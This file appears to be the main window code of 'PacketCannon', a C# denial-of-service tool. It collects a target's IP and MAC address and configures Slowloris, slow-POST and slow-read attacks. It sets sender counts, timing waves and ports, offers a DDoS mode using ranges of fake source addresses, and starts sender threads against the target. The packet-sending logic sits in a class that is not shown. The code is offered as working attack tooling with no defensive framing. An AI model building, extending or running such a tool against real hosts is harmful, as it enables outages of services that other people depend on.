using PcapDotNet.Core;
using PcapDotNet.Packets.Ethernet;
using System;
using System.Net;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows;
using System.Windows.Controls;
using PcapDotNet.Packets.IpV4;

namespace PacketCannon
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow
    {
        public PacketDevice PacketDevice;
        public DosController Setup;
        private Thread _senders;

        public MainWindow()
        {
            Setup = new DosController();
            InitializeComponent();

            this.DataContext = Setup;
        }

        private void HostIpAddressChanged(object sender, TextChangedEventArgs e)
        {
            if (!Regex.IsMatch(HostIpAddress.Text, @"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b"))
            {
                TargetIpAddress.BorderBrush = System.Windows.Media.Brushes.Red;
            }
            else
            {
                TargetIpAddress.BorderBrush = System.Windows.Media.Brushes.DarkGray;
                Setup.SelectedDevice = PacketDevice;
                Setup.SourceIpv4 = HostIpAddress.Text;
            }
        }

        private void TargetIpAddressChanged(object sender, TextChangedEventArgs e)
        {
            if (!Regex.IsMatch(HostIpAddress.Text, @"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b"))
            {
                TargetIpAddress.BorderBrush = System.Windows.Media.Brushes.Red;
            }
            else
            {
                TargetIpAddress.BorderBrush = System.Windows.Media.Brushes.DarkGray;
                Setup.SelectedDevice = PacketDevice;
                Setup.DestinationIpV4 = TargetIpAddress.Text;
            }
        }

        private void ChooseIntButtonClick(object sender, RoutedEventArgs e)
        {
            var interfaceWindow = new IntWindow();
            interfaceWindow.Show();
            IsEnabled = false;
        }

        private void GetTargetMacButtonClick(object sender, RoutedEventArgs e)
        {
            string a;
            try
            {
                a = DosController.GetMacFromIp(TargetIpAddress.Text).ToString();
            }
            catch (Exception exception)
            {
                MessageBox.Show(exception.Message, "DOS", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }

            if (a == "00:00:00:00:00:00")
            {
                if (DosController.PingAddress(TargetIpAddress.Text))
                {
                    TargetMacAddress.Text = DosController.GetMacFromIp(DosController.GetDefaultGateway().ToString()).ToString();
                    return;
                }
                MessageBox.Show("INVALID IP ADDRESS GIVEN", "DOS", MessageBoxButton.OK, MessageBoxImage.Error);
            }
            else TargetMacAddress.Text = a;
        }

        private void Attacks_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            Setup.ChangeAttackMode(Attacks.SelectedIndex.ToString());
        }

        private void CheckBox_Click(object sender, RoutedEventArgs e)
        {
            if (AdditionalSettingsCheckBox.IsChecked == true)
            {
                AdiSettingsGrid.IsEnabled = true;
                AdiSettingsGrid.Visibility = Visibility.Visible;
                DisableAllTextBoxes();
            }
            else
            {
                AdiSettingsGrid.IsEnabled = false;
                AdiSettingsGrid.Visibility = Visibility.Hidden;
            }
        }

        private void DisableAllTextBoxes()
        {
            SlowReadWindowSizeTextBox.IsEnabled = false;
            SlowLorisHeaderTextBox.IsEnabled = false;
            SlowPostHeaderTextBox.IsEnabled = false;
            SenderCountTextBox.IsEnabled = false;
            SendersTimeBetweenTextBox.IsEnabled = false;
            SendersWaveTimeTextBox.IsEnabled = false;
            StartPortTextBox.IsEnabled = false;
            PortStepTextBox.IsEnabled = false;
            SlowLorisKeepAliveDataTextBox.IsEnabled = false;
            SlowReadUrlTextBox.IsEnabled = false;
        }

        #region checkboxAndTextBoxes

        private void SlowReadWindowSize_toogle(object sender, RoutedEventArgs e)
        {
            SlowReadWindowSizeTextBox.IsEnabled = SlowReadWinSizeCheckBox.IsChecked == true;
        }

        private void SlowLorisHeader_toogle(object sender, RoutedEventArgs e)
        {
            SlowLorisHeaderTextBox.IsEnabled = SlowLorisHeaderCheckBox.IsChecked == true;
        }

        private void SlowPostHeader_toogle(object sender, RoutedEventArgs e)
        {
            SlowPostHeaderTextBox.IsEnabled = SlowPostHeaderCheckbox.IsChecked == true;
        }

        private void SenderCount_toogle(object sender, RoutedEventArgs e)
        {
            SenderCountTextBox.IsEnabled = SenderCountCheckBox.IsChecked == true;
        }

        private void SenderTime_toogle(object sender, RoutedEventArgs e)
        {
            SendersTimeBetweenTextBox.IsEnabled = SendersTimeBetweenCheckBox.IsChecked == true;
        }

        private void SenderWave_toogle(object sender, RoutedEventArgs e)
        {
            SendersWaveTimeTextBox.IsEnabled = SenderWaveTimeCheckBox.IsChecked == true;
        }

        private void StartPort_toogle(object sender, RoutedEventArgs e)
        {
            StartPortTextBox.IsEnabled = StartPortCheckBox.IsChecked == true;
        }

        private void PortStep_toogle(object sender, RoutedEventArgs e)
        {
            PortStepTextBox.IsEnabled = PortStepCheckBox.IsChecked == true;
        }

        private void SlowLorisKeepAlive_toogle(object sender, RoutedEventArgs e)
        {
            SlowLorisKeepAliveDataTextBox.IsEnabled = SlowLorisKeepAliveDataCheckBox.IsChecked == true;
        }

        private void SlowReadUrl_toogle(object sender, RoutedEventArgs e)
        {
            SlowReadUrlTextBox.IsEnabled = SlowReadUrlCheckBox.IsChecked == true;
        }

        #endregion checkboxAndTextBoxes

        private void OnlyNumbers(object sender, System.Windows.Input.TextCompositionEventArgs e)
        {
            e.Handled = Regex.IsMatch(e.Text, @"[^0-9]");
        }

        private void StartButton_Click(object sender, RoutedEventArgs e)
        {
            Setup.Terminate = false;
            StartButton.IsEnabled = false;
            StopButton.IsEnabled = true;
            if (CheckAllRequiredFields())
            {
                //      MessageBox.Show(
                //          Setup.SourceIpv4 +
                //                      "\n" + Setup.DestinationIpV4 +
                //                      "\n" + Setup.Communicator +
                //                      "\n" + Setup.senderSize +
                //                      "\n" + Setup.Terminate +
                //                      "\n" + Setup.hostAddress +
                //                      "\n" + Setup.senderTimeOut +
                //                      "\n" + Setup.senderWaveTimeOut +
                //                      "\n" + Setup.SourcePort +
                //                      "\n" + Setup.portStep +
                //                      "\n" + Setup.SourceMac +
                //                      "\n" + Setup.DestinationMac +
                //                      "\n" + Setup.SlowPostContentLength +
                //                      "\n" + Setup.SlowLorisKeepAliveData +
                //                      "\n" + Setup.SlowLorisHeaderNotComplete +
                //                      "\n" + Setup.SlowPostHeader +
                //                      "\n" + Setup.SlowReadUrl
                //  , "DOS", MessageBoxButton.OK, MessageBoxImage.Information);
                _senders = new Thread(Setup.StartSenders);
                _senders.Start();
            }
        }

        private void StopButton_Click(object sender, RoutedEventArgs e)
        {
            Setup.Terminate = true;
            StopButton.IsEnabled = false;
            StartButton.IsEnabled = true;
            _senders.Abort();
        }

        private bool CheckAllRequiredFields()
        {
            if (!TargetIpAddress.Text.Equals("") && !HostIpAddress.Text.Equals("") && !TargetMacAddress.Text.Equals("") && !HostAddress.Text.Equals(""))
            {
                try
                {
                    Setup.DestinationIpV4 = TargetIpAddress.Text;
                    Setup.SourceIpv4 = HostIpAddress.Text;
                    Setup.DestinationMac = new MacAddress(TargetMacAddress.Text);
                    Setup.SourceMac = new MacAddress(HostMacAddress.Text);
                    Setup.HostAddress = HostAddress.Text;
                    CheckAdditionalSettings();
                    CheckDDosSettings();
                    return true;
                }
                catch (ArgumentOutOfRangeException e)
                {
                    MessageBox.Show(e.ParamName, "DOS", MessageBoxButton.OK, MessageBoxImage.Error);
                }
                catch (Exception e)
                {
                    MessageBox.Show("Some field with wrong parameters\n" + e.Message, "DOS", MessageBoxButton.OK, MessageBoxImage.Error);
                }
                Setup.Terminate = true;
                StopButton.IsEnabled = false;
                StartButton.IsEnabled = true;
            }
            return false;
        }

        private void CheckDDosSettings()
        {
            if (SenderCountTextBox.Text == "")
            {
                if (DDosCheckBox.IsChecked == true && Convert.ToInt32(FakeAddressesCount.Text) < 50)
                {
                    throw new ArgumentOutOfRangeException("Dont have enough addresses for every sender");
                }
            }
            else if (DDosCheckBox.IsChecked == true && Convert.ToInt32(SenderCountTextBox.Text) > Convert.ToInt32(FakeAddressesCount.Text))
            {
                throw new ArgumentOutOfRangeException("Dont have enough addresses for every sender");
            }

            if ((bool)DDosCheckBox.IsChecked)
            {
                Setup.Ddos = true;
                if (FakeAddressesCount.Text != "")
                {
                    Setup.DdosCount = Convert.ToInt32(FakeAddressesCount.Text);
                }
            }
        }

        private void CheckAdditionalSettings()
        {
            if (AdditionalSettingsCheckBox.IsChecked == true)
            {
                Setup.SlowPostContentLength =
                    SlowReadWindowSizeTextBox.IsEnabled && SlowReadWindowSizeTextBox.Text != ""
                        ? Convert.ToInt32(SlowReadWindowSizeTextBox.Text)
                        : 1000000;

                Setup.SlowLorisHeaderNotComplete = SlowLorisHeaderTextBox.IsEnabled && SlowLorisHeaderTextBox.Text != ""
                    ? SlowLorisHeaderTextBox.Text
                    : null;

                Setup.SlowPostHeader = SlowPostHeaderTextBox.IsEnabled && SlowPostHeaderTextBox.Text != ""
                    ? SlowPostHeaderTextBox.Text
                    : null;

                if (SenderCountTextBox.IsEnabled && SenderCountTextBox.Text != "")
                {
                    Setup.SenderSize = Convert.ToInt32(SenderCountTextBox.Text);
                }

                if (SendersTimeBetweenTextBox.IsEnabled && SendersTimeBetweenTextBox.Text != "")
                {
                    Setup.SenderTimeOut = Convert.ToInt32(SendersTimeBetweenTextBox.Text);
                }

                if (SendersWaveTimeTextBox.IsEnabled && SendersWaveTimeTextBox.Text != "")
                {
                    Setup.SenderWaveTimeOut = Convert.ToInt32(SendersWaveTimeTextBox.Text);
                }

                if (StartPortTextBox.IsEnabled && StartPortTextBox.Text != "")
                {
                    Setup.SourcePort = Convert.ToInt32(StartPortTextBox.Text);
                }

                if (PortStepTextBox.IsEnabled && PortStepTextBox.Text != "")
                {
                    Setup.PortStep = Convert.ToInt32(PortStepTextBox.Text);
                }

                if (SlowLorisKeepAliveDataTextBox.IsEnabled && SlowLorisKeepAliveDataTextBox.Text != "")
                {
                    Setup.SlowLorisKeepAliveData = SlowLorisKeepAliveDataTextBox.Text;
                }

                if (SlowReadUrlTextBox.IsEnabled && SlowReadUrlTextBox.Text != "")
                {
                    Setup.SlowReadUrl = SlowReadUrlTextBox.Text;
                }
            }
        }

        protected override void OnClosed(EventArgs e)
        {
            base.OnClosed(e);

            Application.Current.Shutdown();
        }

        private void EnableDDosClicked(object sender, RoutedEventArgs e)
        {
            if ((bool)DDosCheckBox.IsChecked)
            {
                FakeAddressesCount.IsEnabled = true;
                FakeAddressesCount.Visibility = Visibility.Visible;
                FakeAddressesMaxValue.IsEnabled = true;
                FakeAddressesMaxValue.Visibility = Visibility.Visible;
                FakeAddressesMinValue.IsEnabled = true;
                FakeAddressesMinValue.Visibility = Visibility.Visible;
            }
            else
            {
                FakeAddressesCount.IsEnabled = false;
                FakeAddressesCount.Visibility = Visibility.Hidden;
                FakeAddressesMaxValue.IsEnabled = false;
                FakeAddressesMaxValue.Visibility = Visibility.Hidden;
                FakeAddressesMinValue.IsEnabled = false;
                FakeAddressesMinValue.Visibility = Visibility.Hidden;
            }
            FakeAddressesCount.IsEnabled = DDosCheckBox.IsChecked == true;
        }
    }
}